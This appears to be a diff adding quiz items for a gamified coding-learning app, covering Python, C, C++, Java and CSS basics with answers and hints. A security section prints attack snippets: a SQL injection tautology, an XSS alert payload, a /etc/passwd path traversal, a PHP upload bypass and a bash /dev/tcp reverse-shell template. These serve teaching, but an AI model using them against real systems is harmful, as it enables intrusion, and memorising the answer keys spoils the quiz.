+            question: "用正则表达式匹配所有数字",
+            template: "import re\ntext = 'abc123def456'\nnums = re.findall(r'___', text)\nprint(nums)  # ['123', '456']",
+            answer: "\\d+",
+            hint: "\\d匹配数字，+表示一个或多个",
+            explanation: "📌 \\d 匹配数字字符。\n\n🔹 \\d 等价于 [0-9]\n🔹 + 表示匹配1个或多个\n🔹 findall返回所有匹配"
+        },
+        {
+            id: 102,
+            title: "匹配邮箱",
+            description: "正则匹配邮箱格式",
+            difficulty: 2,
+            xp: 30,
+            question: "补全邮箱匹配的正则表达式",
+            template: "import re\nemail = 'test@example.com'\nif re.match(r'\\w+___\\w+\\.\\w+', email):\n    print('有效邮箱')",
+            answer: "@",
+            hint: "@符号在邮箱中间",
+            explanation: "📌 邮箱格式：用户名@域名.后缀\n\n🔹 \\w 匹配字母数字下划线\n🔹 \\. 匹配点号(需转义)\n🔹 + 表示至少一个字符"
+        },
+        {
+            id: 103,
+            title: "替换文本",
+            description: "用re.sub替换文本",
+            difficulty: 2,
+            xp: 25,
+            question: "用正则替换所有数字为*",
+            template: "import re\ntext = 'phone: 12345'\nresult = re.___(r'\\d', '*', text)\nprint(result)  # phone: *****",
+            answer: "sub",
+            hint: "substitute的缩写",
+            explanation: "📌 re.sub(pattern, repl, string) 替换匹配内容。\n\n🔹 第一参数：正则模式\n🔹 第二参数：替换内容\n🔹 第三参数：原字符串"
+        },
+        {
+            id: 104,
+            title: "分组提取",
+            description: "用括号分组提取",
+            difficulty: 3,
+            xp: 35,
+            question: "用分组提取年月日",
+            template: "import re\ndate = '2024-01-15'\nm = re.match(r'(\\d+)-(\\d+)-(\\d+)', date)\nyear = m.___（1)\nprint(year)  # 2024",
+            answer: "group",
+            hint: "获取分组内容的方法",
+            explanation: "📌 用()创建分组，group(n)获取第n组。\n\n🔹 group(0)返回整个匹配\n🔹 group(1)返回第一个括号内容\n🔹 groups()返回所有分组的元组"
+        },
+        {
+            id: 105,
+            title: "忽略大小写",
+            description: "正则忽略大小写匹配",
+            difficulty: 2,
+            xp: 20,
+            question: "忽略大小写匹配hello",
+            template: "import re\ntext = 'Hello World'\nif re.search('hello', text, re.___):\n    print('找到了')",
+            answer: "IGNORECASE",
+            hint: "忽略大小写的标志",
+            explanation: "📌 re.IGNORECASE 或 re.I 忽略大小写。\n\n🔹 也可写作 re.I\n🔹 flags参数可组合使用\n🔹 如 re.I | re.M"
+        },
+        // ===== 字典进阶 =====
+        {
+            id: 106,
+            title: "字典推导式",
+            description: "用推导式创建字典",
+            difficulty: 2,
+            xp: 25,
+            question: "用推导式创建平方字典",
+            template: "squares = {x: x**2 ___ x in range(5)}\nprint(squares)  # {0:0, 1:1, 2:4, 3:9, 4:16}",
+            answer: "for",
+            hint: "和列表推导式类似",
+            explanation: "📌 字典推导式 {key: value for item in iterable}\n\n🔹 冒号左边是键\n🔹 冒号右边是值\n🔹 可加if条件过滤"
+        },
+        {
+            id: 107,
+            title: "setdefault",
+            description: "设置默认值",
+            difficulty: 2,
+            xp: 25,
+            question: "用setdefault设置默认值",
+            template: "d = {'a': 1}\nval = d.___(​'b', 0)\nprint(val)  # 0\nprint(d)  # {'a': 1, 'b': 0}",
+            answer: "setdefault",
+            hint: "set + default",
+            explanation: "📌 setdefault(key, default) 键不存在时设置默认值。\n\n🔹 键存在返回原值\n🔹 键不存在设置并返回默认值\n🔹 比get更强大"
+        },
+        {
+            id: 108,
+            title: "字典排序",
+            description: "按值排序字典",
+            difficulty: 2,
+            xp: 30,
+            question: "按字典的值排序",
+            template: "d = {'b': 2, 'a': 1, 'c': 3}\nsorted_d = sorted(d.items(), key=lambda x: x[___])\nprint(sorted_d)",
+            answer: "1",
+            hint: "x[0]是键，x[?]是值",
+            explanation: "📌 items()返回(key, value)元组。\n\n🔹 x[0]是键，x[1]是值\n🔹 sorted()默认升序\n🔹 reverse=True降序"
+        },
+        {
+            id: 109,
+            title: "Counter计数",
+            description: "用Counter统计频率",
+            difficulty: 2,
+            xp: 25,
+            question: "用Counter统计字符出现次数",
+            template: "from collections import ___\ntext = 'hello'\ncount = ___(text)\nprint(count['l'])  # 2",
+            answer: "Counter",
+            hint: "计数器类",
+            explanation: "📌 Counter是字典子类，专门用于计数。\n\n🔹 自动统计元素出现次数\n🔹 most_common(n)返回最常见n个\n🔹 可以做加减运算"
+        },
+        {
+            id: 110,
+            title: "defaultdict",
+            description: "带默认值的字典",
+            difficulty: 2,
+            xp: 25,
+            question: "创建默认值为列表的字典",
+            template: "from collections import defaultdict\nd = defaultdict(___)\nd['a'].append(1)\nprint(d)  # {'a': [1]}",
+            answer: "list",
+            hint: "默认值是什么类型？",
+            explanation: "📌 defaultdict(factory) 访问不存在的键自动创建默认值。\n\n🔹 list创建空列表\n🔹 int创建0\n🔹 避免KeyError"
+        },
+        // ===== 函数进阶 =====
+        {
+            id: 111,
+            title: "默认参数",
+            description: "函数默认参数值",
+            difficulty: 1,
+            xp: 15,
+            question: "设置默认参数值",
+            template: "def greet(name, msg___'Hello'):\n    return f'{msg}, {name}!'\nprint(greet('Tom'))  # Hello, Tom!",
+            answer: "=",
+            hint: "用什么符号设置默认值？",
+            explanation: "📌 默认参数用=号设置。\n\n🔹 默认参数必须在后面\n🔹 调用时可省略有默认值的参数\n🔹 避免用可变对象作默认值"
+        },
+        {
+            id: 112,
+            title: "可变参数",
+            description: "*args接收多个参数",
+            difficulty: 2,
+            xp: 25,
+            question: "用*args接收任意多参数",
+            template: "def sum_all(___args):\n    return sum(args)\nprint(sum_all(1, 2, 3, 4))  # 10",
+            answer: "*",
+            hint: "一个星号",
+            explanation: "📌 *args 将多个参数收集为元组。\n\n🔹 args是元组类型\n🔹 名字可以任意，如*numbers\n🔹 必须在普通参数之后"
+        },
+        {
+            id: 113,
+            title: "关键字参数",
+            description: "**kwargs接收关键字参数",
+            difficulty: 2,
+            xp: 25,
+            question: "用**kwargs接收关键字参数",
+            template: "def info(___kwargs):\n    for k, v in kwargs.items():\n        print(f'{k}: {v}')\ninfo(name='Tom', age=20)",
+            answer: "**",
+            hint: "两个星号",
+            explanation: "📌 **kwargs 将关键字参数收集为字典。\n\n🔹 kwargs是字典类型\n🔹 必须在*args之后\n🔹 名字可以任意"
+        },
+        {
+            id: 114,
+            title: "递归函数",
+            description: "函数调用自身",
+            difficulty: 2,
+            xp: 30,
+            question: "用递归计算阶乘",
+            template: "def factorial(n):\n    if n <= 1:\n        return 1\n    return n * ___(n-1)\nprint(factorial(5))  # 120",
+            answer: "factorial",
+            hint: "函数调用自己",
+            explanation: "📌 递归：函数调用自身。\n\n🔹 必须有终止条件\n🔹 每次调用问题规模减小\n🔹 注意递归深度限制"
+        },
+        {
+            id: 115,
+            title: "闭包",
+            description: "返回内部函数",
+            difficulty: 3,
+            xp: 35,
+            question: "创建一个计数器闭包",
+            template: "def counter():\n    count = 0\n    def inner():\n        nonlocal count\n        count += 1\n        ___ count\n    return inner",
+            answer: "return",
+            hint: "返回计数值",
+            explanation: "📌 闭包：内部函数引用外部变量。\n\n🔹 nonlocal声明外层变量\n🔹 闭包可以记住状态\n🔹 常用于装饰器"
+        },
+        // ===== 文件操作进阶 =====
+        {
+            id: 116,
+            title: "读取所有行",
+            description: "readlines读取所有行",
+            difficulty: 1,
+            xp: 15,
+            question: "读取文件所有行到列表",
+            template: "with open('file.txt', 'r') as f:\n    lines = f.___()\nprint(lines)  # 返回列表",
+            answer: "readlines",
+            hint: "read + lines",
+            explanation: "📌 readlines() 返回所有行的列表。\n\n🔹 每行包含换行符\\n\n🔹 大文件占用内存多\n🔹 建议用for逐行读取"
+        },
+        {
+            id: 117,
+            title: "追加写入",
+            description: "追加内容到文件末尾",
+            difficulty: 1,
+            xp: 15,
+            question: "以追加模式打开文件",
+            template: "with open('log.txt', '___') as f:\n    f.write('新日志\\n')",
+            answer: "a",
+            hint: "append的首字母",
+            explanation: "📌 'a'模式追加写入，不覆盖原内容。\n\n🔹 'w'会覆盖原文件\n🔹 'a'在文件末尾追加\n🔹 'a+'可读可追加"
+        },
+        {
+            id: 118,
+            title: "文件是否存在",
+            description: "检查文件是否存在",
+            difficulty: 1,
+            xp: 15,
+            question: "检查文件是否存在",
+            template: "import os\nif os.path.___(​'file.txt'):\n    print('文件存在')",
+            answer: "exists",
+            hint: "存在的英文",
+            explanation: "📌 os.path.exists() 检查路径是否存在。\n\n🔹 返回True/False\n🔹 可检查文件或目录\n🔹 也可用pathlib模块"
+        },
+        {
+            id: 119,
+            title: "JSON读写",
+            description: "读写JSON文件",
+            difficulty: 2,
+            xp: 25,
+            question: "将数据写入JSON文件",
+            template: "import json\ndata = {'name': 'Tom'}\nwith open('data.json', 'w') as f:\n    json.___(data, f)",
+            answer: "dump",
+            hint: "写入用dump",
+            explanation: "📌 json.dump(obj, file) 写入JSON文件。\n\n🔹 dump写文件，dumps转字符串\n🔹 load读文件，loads解析字符串\n🔹 ensure_ascii=False支持中文"
+        },
+        {
+            id: 120,
+            title: "CSV读取",
+            description: "读取CSV文件",
+            difficulty: 2,
+            xp: 25,
+            question: "用csv模块读取文件",
+            template: "import csv\nwith open('data.csv', 'r') as f:\n    reader = csv.___(f)\n    for row in reader:\n        print(row)",
+            answer: "reader",
+            hint: "创建CSV读取器",
+            explanation: "📌 csv.reader(file) 创建CSV读取器。\n\n🔹 返回迭代器，逐行读取\n🔹 每行是一个列表\n🔹 DictReader可得字典"
+        },
+        // ===== 异常处理进阶 =====
+        {
+            id: 121,
+            title: "捕获多种异常",
+            description: "一次捕获多种异常",
+            difficulty: 2,
+            xp: 25,
+            question: "同时捕获多种异常",
+            template: "try:\n    x = int('abc')\nexcept (ValueError, ___) as e:\n    print('错误:', e)",
+            answer: "TypeError",
+            hint: "类型错误",
+            explanation: "📌 用元组捕获多种异常。\n\n🔹 except (E1, E2) 捕获多种\n🔹 as e 获取异常对象\n🔹 Exception捕获所有"
+        },
+        {
+            id: 122,
+            title: "finally块",
+            description: "无论如何都执行",
+            difficulty: 2,
+            xp: 20,
+            question: "添加finally块",
+            template: "try:\n    f = open('test.txt')\nexcept FileNotFoundError:\n    print('文件不存在')\n___:\n    print('清理完成')",
+            answer: "finally",
+            hint: "最终的英文",
+            explanation: "📌 finally 块无论是否异常都会执行。\n\n🔹 常用于资源清理\n🔹 即使有return也会执行\n🔹 with语句更推荐"
+        },
+        {
+            id: 123,
+            title: "抛出异常",
+            description: "主动抛出异常",
+            difficulty: 2,
+            xp: 25,
+            question: "主动抛出ValueError",
+            template: "def check_age(age):\n    if age < 0:\n        ___ ValueError('年龄不能为负')\n    return age",
+            answer: "raise",
+            hint: "举起/抛出",
+            explanation: "📌 raise 主动抛出异常。\n\n🔹 raise Exception('信息')\n🔹 raise不带参数重新抛出\n🔹 可抛出自定义异常"
+        },
+        {
+            id: 124,
+            title: "自定义异常",
+            description: "创建自定义异常类",
+            difficulty: 3,
+            xp: 30,
+            question: "定义自定义异常类",
+            template: "class MyError(___​):\n    pass\n\nraise MyError('自定义错误')",
+            answer: "Exception",
+            hint: "继承哪个基类？",
+            explanation: "📌 自定义异常继承Exception类。\n\n🔹 可添加__init__自定义属性\n🔹 可添加__str__自定义输出\n🔹 便于区分不同错误类型"
+        },
+        {
+            id: 125,
+            title: "断言",
+            description: "assert断言检查",
+            difficulty: 2,
+            xp: 20,
+            question: "使用断言检查条件",
+            template: "def divide(a, b):\n    ___ b != 0, '除数不能为0'\n    return a / b",
+            answer: "assert",
+            hint: "断言关键字",
+            explanation: "📌 assert 条件为False时抛出AssertionError。\n\n🔹 用于调试和测试\n🔹 生产环境可用-O禁用\n🔹 不应处理业务逻辑"
+        },
+        // ===== 面向对象进阶 =====
+        {
+            id: 126,
+            title: "类属性",
+            description: "定义类属性",
+            difficulty: 2,
+            xp: 20,
+            question: "定义所有实例共享的属性",
+            template: "class Dog:\n    species = '犬类'  # ___属性\n    def __init__(self, name):\n        self.name = name  # 实例属性",
+            answer: "类",
+            hint: "所有实例共享的属性叫什么属性？",
+            explanation: "📌 类属性在类内、方法外定义，所有实例共享。\n\n🔹 类名.属性 访问类属性\n🔹 self.属性 访问实例属性\n🔹 修改类属性影响所有实例"
+        },
+        {
+            id: 127,
+            title: "类方法",
+            description: "@classmethod装饰器",
+            difficulty: 2,
+            xp: 25,
+            question: "定义类方法",
+            template: "class MyClass:\n    count = 0\n    @___\n    def get_count(cls):\n        return cls.count",
+            answer: "classmethod",
+            hint: "类方法的装饰器",
+            explanation: "📌 @classmethod 定义类方法，第一个参数是cls。\n\n🔹 可通过类或实例调用\n🔹 常用于工厂方法\n🔹 能访问类属性"
+        },
+        {
+            id: 128,
+            title: "静态方法",
+            description: "@staticmethod装饰器",
+            difficulty: 2,
+            xp: 25,
+            question: "定义静态方法",
+            template: "class Math:\n    @___\n    def add(a, b):\n        return a + b",
+            answer: "staticmethod",
+            hint: "静态方法的装饰器",
+            explanation: "📌 @staticmethod 定义静态方法，不需要self或cls。\n\n🔹 像普通函数，但属于类\n🔹 不能访问实例/类属性\n🔹 组织相关功能"
+        },
+        {
+            id: 129,
+            title: "属性装饰器",
+            description: "@property将方法变属性",
+            difficulty: 2,
+            xp: 30,
+            question: "用@property创建只读属性",
+            template: "class Circle:\n    def __init__(self, r):\n        self.r = r\n    @___\n    def area(self):\n        return 3.14 * self.r ** 2",
+            answer: "property",
+            hint: "属性装饰器",
+            explanation: "📌 @property 将方法变成属性访问。\n\n🔹 调用时不需要括号\n🔹 可配合setter设置值\n🔹 实现属性的计算和验证"
+        },
+        {
+            id: 130,
+            title: "魔术方法__str__",
+            description: "自定义对象字符串表示",
+            difficulty: 2,
+            xp: 25,
+            question: "自定义print输出",
+            template: "class Person:\n    def __init__(self, name):\n        self.name = name\n    def ___(self):\n        return f'Person: {self.name}'",
+            answer: "__str__",
+            hint: "字符串表示的魔术方法",
+            explanation: "📌 __str__ 定义print()和str()的输出。\n\n🔹 返回用户友好的字符串\n🔹 __repr__ 返回开发者信息\n🔹 没有__str__时用__repr__"
+        },
+        // ===== 高级技巧 =====
+        {
+            id: 131,
+            title: "装饰器基础",
+            description: "创建简单装饰器",
+            difficulty: 3,
+            xp: 35,
+            question: "创建一个打印日志的装饰器",
+            template: "def log(func):\n    def wrapper(*args):\n        print(f'调用{func.__name__}')\n        return ___(​*args)\n    return wrapper",
+            answer: "func",
+            hint: "调用被装饰的函数",
+            explanation: "📌 装饰器：接收函数，返回新函数。\n\n🔹 在不修改原函数情况下增加功能\n🔹 @语法是语法糖\n🔹 常用于日志、计时、权限"
+        },
+        {
+            id: 132,
+            title: "生成器函数",
+            description: "用yield创建生成器",
+            difficulty: 3,
+            xp: 30,
+            question: "创建一个生成器函数",
+            template: "def count_up(n):\n    i = 0\n    while i < n:\n        ___ i\n        i += 1",
+            answer: "yield",
+            hint: "生成器用什么关键字？",
+            explanation: "📌 yield 使函数变成生成器。\n\n🔹 每次yield暂停并返回值\n🔹 next()继续执行\n🔹 内存效率高"
+        },
+        {
+            id: 133,
+            title: "生成器表达式",
+            description: "用圆括号创建生成器",
+            difficulty: 2,
+            xp: 25,
+            question: "创建生成器表达式",
+            template: "# 列表推导用[]\n# 生成器表达式用()\ngen = ___ x**2 for x in range(5))\nprint(list(gen))",
+            answer: "(",
+            hint: "用什么括号？",
+            explanation: "📌 生成器表达式用圆括号()。\n\n🔹 (expr for x in iterable)\n🔹 惰性计算，节省内存\n🔹 只能遍历一次"
+        },
+        {
+            id: 134,
+            title: "上下文管理器",
+            description: "自定义with语句",
+            difficulty: 3,
+            xp: 35,
+            question: "实现__enter__方法",
+            template: "class MyContext:\n    def ___(self):\n        print('进入')\n        return self\n    def __exit__(self, *args):\n        print('退出')",
+            answer: "__enter__",
+            hint: "进入时调用的方法",
+            explanation: "📌 上下文管理器需实现__enter__和__exit__。\n\n🔹 with语句自动调用\n🔹 __enter__返回值赋给as变量\n🔹 __exit__处理清理和异常"
+        },
+        {
+            id: 135,
+            title: "枚举类型",
+            description: "创建枚举",
+            difficulty: 2,
+            xp: 25,
+            question: "创建枚举类",
+            template: "from enum import ___\nclass Color(___):\n    RED = 1\n    GREEN = 2\n    BLUE = 3",
+            answer: "Enum",
+            hint: "枚举基类",
+            explanation: "📌 Enum 创建枚举类型。\n\n🔹 成员是唯一的常量\n🔹 可通过名称或值访问\n🔹 适合表示固定选项"
+        },
+        {
+            id: 136,
+            title: "类型注解",
+            description: "函数参数类型注解",
+            difficulty: 2,
+            xp: 20,
+            question: "添加参数类型注解",
+            template: "def greet(name___ str) -> str:\n    return f'Hello, {name}'",
+            answer: ":",
+            hint: "注解用什么符号？",
+            explanation: "📌 类型注解用冒号:声明类型。\n\n🔹 参数: 类型\n🔹 -> 返回值类型\n🔹 不强制检查，用于文档和IDE"
+        },
+        {
+            id: 137,
+            title: "dataclass",
+            description: "数据类装饰器",
+            difficulty: 2,
+            xp: 30,
+            question: "使用dataclass简化类定义",
+            template: "from dataclasses import ___\n@___\nclass Point:\n    x: int\n    y: int",
+            answer: "dataclass",
+            hint: "数据类装饰器名称",
+            explanation: "📌 @dataclass 自动生成__init__等方法。\n\n🔹 自动生成构造函数\n🔹 自动生成__repr__\n🔹 可选生成比较方法"
+        },
+        {
+            id: 138,
+            title: "海象运算符",
+            description: "赋值表达式:=",
+            difficulty: 2,
+            xp: 25,
+            question: "用海象运算符简化代码",
+            template: "# Python 3.8+\nif (n ___ len(data)) > 10:\n    print(f'长度{n}超过10')",
+            answer: ":=",
+            hint: "像海象的眼睛和牙齿",
+            explanation: "📌 := 海象运算符，在表达式中赋值。\n\n🔹 Python 3.8+支持\n🔹 减少重复计算\n🔹 适合while和if条件"
+        },
+        {
+            id: 139,
+            title: "match语句",
+            description: "模式匹配",
+            difficulty: 3,
+            xp: 30,
+            question: "使用match进行模式匹配",
+            template: "# Python 3.10+\ndef check(x):\n    ___ x:\n        case 0:\n            return '零'\n        case _:\n            return '其他'",
+            answer: "match",
+            hint: "匹配关键字",
+            explanation: "📌 match-case 是Python 3.10+的模式匹配。\n\n🔹 类似其他语言的switch\n🔹 支持复杂模式匹配\n🔹 _是通配符"
+        },
+        {
+            id: 140,
+            title: "位置参数only",
+            description: "仅限位置参数",
+            difficulty: 3,
+            xp: 30,
+            question: "定义仅限位置参数",
+            template: "# /之前的参数只能按位置传\ndef func(a, b, ___, c):\n    return a + b + c",
+            answer: "/",
+            hint: "斜杠",
+            explanation: "📌 / 之前的参数只能按位置传递。\n\n🔹 Python 3.8+支持\n🔹 防止参数名被依赖\n🔹 与*（仅限关键字）相对"
+        },
+        // ========== 网络安全挑战题 ==========
+        {
+            id: 201,
+            title: "HTTP基础",
+            description: "了解HTTP请求方法",
+            difficulty: 1,
+            xp: 10,
+            courseType: "security",
+            question: "获取网页数据最常用的HTTP方法是？",
+            template: "# 访问网站时浏览器发送的请求\nmethod = '___'",
+            answer: "GET",
+            hint: "获取数据用什么方法？",
+            explanation: "📌 GET是最常用的HTTP请求方法。\n\n🔹 GET - 获取资源\n🔹 POST - 提交数据\n🔹 PUT - 更新资源\n🔹 DELETE - 删除资源"
+        },
+        {
+            id: 202,
+            title: "状态码识别",
+            description: "识别HTTP状态码",
+            difficulty: 1,
+            xp: 10,
+            courseType: "security",
+            question: "表示请求成功的HTTP状态码是？",
+            template: "# 服务器返回成功的状态码\nstatus_code = ___",
+            answer: "200",
+            hint: "最常见的成功状态码",
+            explanation: "📌 HTTP状态码分类：\n\n🔹 2xx - 成功 (200 OK)\n🔹 3xx - 重定向 (301/302)\n🔹 4xx - 客户端错误 (404 Not Found)\n🔹 5xx - 服务器错误 (500)"
+        },
+        {
+            id: 203,
+            title: "SQL注入入门",
+            description: "理解SQL注入原理",
+            difficulty: 2,
+            xp: 20,
+            courseType: "security",
+            question: "SQL注入中用于注释后续内容的符号是？",
+            template: "# SQL注入：admin' OR '1'='1' ___\n# 注释掉后面的SQL语句",
+            answer: "--",
+            hint: "SQL中的单行注释符号",
+            explanation: "📌 SQL注入常用技巧：\n\n🔹 -- 单行注释\n🔹 /* */ 多行注释\n🔹 # MySQL注释\n🔹 永真条件：OR '1'='1'"
+        },
+        {
+            id: 204,
+            title: "XSS攻击",
+            description: "跨站脚本攻击",
+            difficulty: 2,
+            xp: 20,
+            courseType: "security",
+            question: "XSS攻击中常用来弹窗测试的JavaScript函数是？",
+            template: "// 测试XSS漏洞\n___('XSS漏洞存在！')",
+            answer: "alert",
+            hint: "JavaScript弹窗函数",
+            explanation: "📌 XSS测试常用payload：\n\n🔹 alert() 弹窗测试\n🔹 document.cookie 获取Cookie\n🔹 location.href 重定向\n\n⚠️ 仅在授权环境测试！"
+        },
+        {
+            id: 205,
+            title: "目录遍历",
+            description: "路径穿越攻击",
+            difficulty: 2,
+            xp: 25,
+            courseType: "security",
+            question: "目录遍历攻击中，返回上级目录的符号是？",
+            template: "# 尝试读取/etc/passwd\npath = '___/___/___/etc/passwd'",
+            answer: "..",
+            hint: "在路径中表示父目录",
+            explanation: "📌 目录遍历攻击：\n\n🔹 ../返回上级目录\n🔹 常见目标：/etc/passwd\n🔹 防御：过滤../，使用白名单"
+        },
+        {
+            id: 206,
+            title: "WebShell命令",
+            description: "系统命令执行",
+            difficulty: 2,
+            xp: 20,
+            courseType: "security",
+            question: "Linux中查看当前用户的命令是？",
+            template: "# 查看当前登录用户\n$ ___",
+            answer: "whoami",
+            hint: "who am i的简写",
+            explanation: "📌 常用Linux命令：\n\n🔹 whoami - 当前用户\n🔹 pwd - 当前目录\n🔹 ls - 列出文件\n🔹 cat - 查看文件\n🔹 uname -a - 系统信息"
+        },
+        {
+            id: 207,
+            title: "端口扫描",
+            description: "常见服务端口",
+            difficulty: 2,
+            xp: 20,
+            courseType: "security",
+            question: "HTTP服务默认使用的端口号是？",
+            template: "# Web服务器默认端口\nhttp_port = ___",
+            answer: "80",
+            hint: "最常见的Web端口",
+            explanation: "📌 常见端口：\n\n🔹 80 - HTTP\n🔹 443 - HTTPS\n🔹 22 - SSH\n🔹 3306 - MySQL\n🔹 3389 - RDP远程桌面"
+        },
+        {
+            id: 208,
+            title: "文件上传绕过",
+            description: "绕过文件类型检测",
+            difficulty: 3,
+            xp: 30,
+            courseType: "security",
+            question: "PHP文件的常见扩展名（可绕过.php过滤）是？",
+            template: "# 上传恶意文件绕过检测\nfilename = 'shell.___'",
+            answer: "phtml",
+            hint: "PHP的另一个扩展名",
+            explanation: "📌 PHP可执行扩展名：\n\n🔹 .php .phtml .php3\n🔹 .php4 .php5 .pht\n🔹 防御：白名单验证"
+        },
+        {
+            id: 209,
+            title: "密码学基础",
+            description: "常见哈希算法",
+            difficulty: 2,
+            xp: 20,
+            courseType: "security",
+            question: "生成32位十六进制字符串的哈希算法是？",
+            template: "# 128位哈希，32个十六进制字符\nhash_type = '___'",
+            answer: "MD5",
+            hint: "Message Digest 5",
+            explanation: "📌 常见哈希算法：\n\n🔹 MD5 - 128位，已不安全\n🔹 SHA1 - 160位\n🔹 SHA256 - 256位，推荐\n🔹 bcrypt - 密码专用"
+        },
+        {
+            id: 210,
+            title: "反弹Shell",
+            description: "反向连接技术",
+            difficulty: 3,
+            xp: 35,
+            courseType: "security",
+            question: "Bash反弹Shell中用于重定向的设备文件是？",
+            template: "# bash -i >& /dev/___/IP/PORT 0>&1",
+            answer: "tcp",
+            hint: "网络协议名称",
+            explanation: "📌 反弹Shell原理：\n\n🔹 目标机器主动连接攻击者\n🔹 绕过入站防火墙\n🔹 /dev/tcp是bash特性\n\n⚠️ 仅用于授权测试！"
+        },
+        // ========== C语言挑战 ==========
+        { id: 301, title: "Hello C", description: "C语言输出", difficulty: 1, xp: 10, courseType: "c", question: "C语言输出用什么函数？", template: "#include <stdio.h>\nint main() {\n    ___(\"Hello C!\");\n    return 0;\n}", answer: "printf", hint: "print + format", explanation: "📌 printf是C语言最常用的输出函数" },
+        { id: 302, title: "变量声明", description: "整数变量", difficulty: 1, xp: 10, courseType: "c", question: "声明一个整数变量用什么类型？", template: "___ age = 18;", answer: "int", hint: "integer的缩写", explanation: "📌 int是C语言最常用的整数类型" },
+        { id: 303, title: "格式化输出", description: "输出整数", difficulty: 1, xp: 15, courseType: "c", question: "printf输出整数用什么格式符？", template: "int n = 10;\nprintf(\"数字是: ___\", n);", answer: "%d", hint: "decimal", explanation: "📌 %d用于输出十进制整数" },
+        { id: 304, title: "取地址", description: "指针基础", difficulty: 2, xp: 20, courseType: "c", question: "获取变量地址用什么运算符？", template: "int num = 10;\nint *ptr = ___num;", answer: "&", hint: "and符号", explanation: "📌 &是取地址运算符" },
+        { id: 305, title: "解引用", description: "访问指针值", difficulty: 2, xp: 20, courseType: "c", question: "通过指针获取值用什么运算符？", template: "int *ptr = &num;\nint value = ___ptr;", answer: "*", hint: "星号", explanation: "📌 *是解引用运算符" },
+        { id: 306, title: "动态内存", description: "内存分配", difficulty: 2, xp: 25, courseType: "c", question: "动态分配内存用什么函数？", template: "int *arr = (int*)___(10 * sizeof(int));", answer: "malloc", hint: "memory allocation", explanation: "📌 malloc用于动态分配内存" },
+        { id: 307, title: "释放内存", description: "防止内存泄漏", difficulty: 2, xp: 20, courseType: "c", question: "释放动态内存用什么函数？", template: "___(ptr);\nptr = NULL;", answer: "free", hint: "释放的英文", explanation: "📌 free释放malloc分配的内存" },
+        { id: 308, title: "字符串长度", description: "strlen函数", difficulty: 1, xp: 15, courseType: "c", question: "获取字符串长度的函数？", template: "#include <string.h>\nint len = ___(\"Hello\");", answer: "strlen", hint: "string length", explanation: "📌 strlen返回字符串长度（不含\\0）" },
+        // ========== C++挑战 ==========
+        { id: 401, title: "Hello C++", description: "C++输出", difficulty: 1, xp: 10, courseType: "cpp", question: "C++输出用什么对象？", template: "#include <iostream>\nusing namespace std;\nint main() {\n    ___ << \"Hello C++!\";\n    return 0;\n}", answer: "cout", hint: "console out", explanation: "📌 cout是C++标准输出流对象" },
+        { id: 402, title: "换行符", description: "C++换行", difficulty: 1, xp: 10, courseType: "cpp", question: "C++中换行用什么？", template: "cout << \"Hello\" << ___;", answer: "endl", hint: "end line", explanation: "📌 endl输出换行并刷新缓冲区" },
+        { id: 403, title: "输入", description: "C++输入", difficulty: 1, xp: 15, courseType: "cpp", question: "C++输入用什么对象？", template: "int age;\n___ >> age;", answer: "cin", hint: "console in", explanation: "📌 cin是C++标准输入流对象" },
+        { id: 404, title: "引用", description: "变量别名", difficulty: 2, xp: 20, courseType: "cpp", question: "声明引用用什么符号？", template: "int num = 10;\nint ___ref = num;", answer: "&", hint: "和取地址一样的符号", explanation: "📌 &在类型后面表示引用" },
+        { id: 405, title: "类定义", description: "面向对象", difficulty: 2, xp: 20, courseType: "cpp", question: "定义类用什么关键字？", template: "___ Student {\npublic:\n    string name;\n};", answer: "class", hint: "类的英文", explanation: "📌 class用于定义类" },
+        { id: 406, title: "私有成员", description: "访问控制", difficulty: 2, xp: 20, courseType: "cpp", question: "私有成员用什么关键字？", template: "class Person {\n___:\n    int age;\n};", answer: "private", hint: "私有的英文", explanation: "📌 private成员只能在类内访问" },
+        { id: 407, title: "继承", description: "类继承", difficulty: 2, xp: 25, courseType: "cpp", question: "类继承用什么符号？", template: "class Dog ___ public Animal {\n};", answer: ":", hint: "冒号", explanation: "📌 :用于表示继承关系" },
+        { id: 408, title: "动态数组", description: "STL容器", difficulty: 2, xp: 20, courseType: "cpp", question: "C++ STL中动态数组叫什么？", template: "#include <___>\nusing namespace std;", answer: "vector", hint: "向量的英文", explanation: "📌 vector是最常用的STL容器" },
+        // ========== Java挑战 ==========
+        { id: 501, title: "Hello Java", description: "Java输出", difficulty: 1, xp: 10, courseType: "java", question: "Java输出语句？", template: "___.out.println(\"Hello Java!\");", answer: "System", hint: "系统类", explanation: "📌 System.out.println是Java标准输出" },
+        { id: 502, title: "主方法", description: "程序入口", difficulty: 1, xp: 15, courseType: "java", question: "Java主方法的返回类型？", template: "public static ___ main(String[] args) {}", answer: "void", hint: "无返回值", explanation: "📌 main方法返回void" },
+        { id: 503, title: "字符串类型", description: "文本数据", difficulty: 1, xp: 10, courseType: "java", question: "Java字符串类型？", template: "___ name = \"张三\";", answer: "String", hint: "首字母大写", explanation: "📌 String是Java的字符串类" },
+        { id: 504, title: "创建对象", description: "实例化", difficulty: 1, xp: 15, courseType: "java", question: "创建对象用什么关键字？", template: "Student s = ___ Student();", answer: "new", hint: "新的", explanation: "📌 new用于创建对象实例" },
+        { id: 505, title: "继承", description: "类继承", difficulty: 2, xp: 20, courseType: "java", question: "Java继承用什么关键字？", template: "class Dog ___ Animal {}", answer: "extends", hint: "扩展", explanation: "📌 extends表示继承" },
+        { id: 506, title: "实现接口", description: "接口实现", difficulty: 2, xp: 20, courseType: "java", question: "实现接口用什么关键字？", template: "class Bird ___ Flyable {}", answer: "implements", hint: "实现的英文", explanation: "📌 implements实现接口" },
+        { id: 507, title: "动态数组", description: "集合框架", difficulty: 2, xp: 20, courseType: "java", question: "Java动态数组类？", template: "___<String> list = new ArrayList<>();", answer: "ArrayList", hint: "数组列表", explanation: "📌 ArrayList是最常用的集合类" },
+        { id: 508, title: "异常处理", description: "捕获异常", difficulty: 2, xp: 25, courseType: "java", question: "捕获异常用什么关键字？", template: "try {\n    // 代码\n} ___ (Exception e) {}", answer: "catch", hint: "捕获的英文", explanation: "📌 catch用于捕获异常" },
+        // ========== CSS挑战 ==========
+        { id: 601, title: "背景颜色", description: "设置背景", difficulty: 1, xp: 10, courseType: "css", question: "设置背景颜色的属性？", template: "body {\n    ___: #f0f0f0;\n}", answer: "background-color", hint: "背景-颜色", explanation: "📌 background-color设置背景颜色" },
